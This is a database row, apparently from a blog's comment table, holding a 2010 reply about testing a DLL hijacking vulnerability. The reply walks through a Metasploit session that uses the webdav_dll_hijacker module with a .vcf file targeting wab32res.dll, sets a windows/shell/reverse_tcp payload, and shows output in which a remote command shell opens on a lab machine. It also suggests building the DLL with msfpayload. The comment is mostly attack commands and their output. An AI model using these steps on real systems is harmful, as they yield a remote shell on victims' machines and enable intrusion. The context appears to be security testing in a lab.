'492','','1','Matt','70.89.197.145','matt@attackvector.org','http://www.attackvector.org','@rusopro: Ok.. a couple things to try\n\n1) Check out the \"webdav_dll_hijacker\" module.  This will help you see some of what\'s going on behind the scenes.  Run it from within the msfconsole.\n2) Try targeting WAB instead of utorrent.  (create a .vcf file and the DLL in question is \'wab32res.dll\')\n\nExample:\n\n<blockquote>\nmsf &gt; use windows/browser/webdav_dll_hijacker\nmsf exploit(webdav_dll_hijacker) &gt; set extensions vcf\nextensions =&gt; vcf\nmsf exploit(webdav_dll_hijacker) &gt; set srvhost 192.168.1.101\nsrvhost =&gt; 192.168.1.101\nmsf exploit(webdav_dll_hijacker) &gt; set payload windows/shell/reverse_tcp\npayload =&gt; windows/shell/reverse_tcp\nmsf exploit(webdav_dll_hijacker) &gt; set lhost 192.168.1.101\nlhost =&gt; 192.168.1.101\nmsf exploit(webdav_dll_hijacker) &gt; exploit\n[*] Exploit running as background job.\n\n[*] Started reverse handler on 192.168.1.101:4444 \n[*] \n[*] Exploit links are now available at \\192.168.1.101documents\n[*] \n[*] Using URL: http://192.168.1.101:80/\n[*] Server started.\n..snip..\n[*] 192.168.1.102:1062 PROPFIND /documents/wab32res.dll\n[*] 192.168.1.102:1062 PROPFIND =&gt; 207 File (/documents/wab32res.dll)\n..snip..\n[*] Sending stage (240 bytes) to 192.168.1.102\n[*] Command shell session 1 opened (192.168.1.101:4444 -&gt; 192.168.1.102:1065) at Thu Sep 02 09:54:36 -0500 2010\n</blockquote>\n\nIf that succeeds, then try creating the wab32res.dll using msfpayload and see if that works.  If it does, my hunch is that your version of utorrent is not vulnerable to DLL hijacking','2010-09-02 09:57:16','2010-09-02 14:57:16','0','491','523','','2'),(
